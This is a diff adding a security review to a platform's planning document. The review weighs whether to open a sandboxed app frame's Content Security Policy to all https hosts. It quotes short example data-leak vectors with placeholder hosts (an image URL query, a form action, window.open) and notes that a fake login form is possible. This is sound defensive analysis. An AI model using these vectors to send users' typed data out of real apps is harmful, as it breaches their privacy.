@@ -279,6 +279,52 @@ each entry below says whether it is pre-approved.
     Overlaps to settle at its start: app-libraries (CDN hosts) and
     web-search-and-images B (server-fetched images) — keep whichever is
     simpler for each case.
+
+    **Review 2026-10-22 — what opening the apps' network would expose.**
+    *Docs only; the CSP does not change until 기태님 confirms.*
+    - **Today:** apps run on `apps.ctrlai.my` in a frame sandboxed with
+      `allow-scripts allow-forms allow-popups allow-downloads` (never
+      `allow-same-origin`); the files' CSP has `connect-src 'none'`,
+      `img-src 'self' data: blob:` and no CDN
+      (`backend/app/services/app_shell.py` `app_files_csp`,
+      `deploy/Caddyfile`). So no outside photos, map tiles, chart/game
+      libraries or weather/rate APIs.
+    - **Safe either way (by structure):** the session cookie (HttpOnly,
+      host-only, and the sandbox has no `allow-same-origin`); account data
+      (`ctrlai.user()` gives only `displayName` and the per-app
+      `appUserId` — no email); money (AI still goes through the server's
+      `usage.charge()`).
+    - **What could leave:** the visitor's IP address; whatever the visitor
+      typed into that app; and anything the app can already read — public
+      `ctrlai.db` data (other members' posts with their `displayName`),
+      AI answers, `displayName`/`appUserId`.
+    - **"Display-only" loads are not IP-only.** Any URL can carry data in
+      its path or query (`<img src="https://x/?d=…">`), so opening
+      `img-src`/`script-src`/`style-src`/`font-src` to every host is, for
+      leaks, about the same as opening `connect-src`. The split "display
+      loads open, `connect-src` on an allow-list" does not give the
+      protection it looks like.
+    - **Today is not fully closed either.** The files' CSP has no
+      `form-action`, and the sandbox allows forms and popups: a `<form
+      action="https://…">` or a `window.open("https://…?d=…")` can already
+      send typed content out, and a fake login form is already possible.
+      So opening the network adds less new risk than it seems; the visible
+      hole is forms/popups, not `connect-src`.
+    - **Outside scripts and the wallet:** with `script-src` open, a third
+      party's code runs inside the app and could call `ctrlai.ai.ask` on
+      the visitor's wallet — bounded by the per-app cap, 데모 and 기능 상자
+      멈추기, but no longer only the maker's code.
+    - **Conclusion so far:** blocking everything was a conservative default
+      ("member code, so block it all"), not an answer to a specific
+      threat. For an invite-only club with little personal data, the
+      owner's direction is **allow every https host**. If so: one line in
+      the 개인정보 처리방침 ("apps may use outside services; your IP may
+      reach them"), problems handled through 신고, and this replaces points
+      1–3 above (the allow-list and its deny list). Separately worth
+      deciding: whether to close the forms/popups path (`form-action`).
+    - **Waiting for 기태님's confirmation.** If full allow is chosen,
+      settle app-libraries (6) and web-search-and-images B at the same
+      time — much of both may no longer be needed.
 ---
 
 ## After the beta (specced, not in Next)
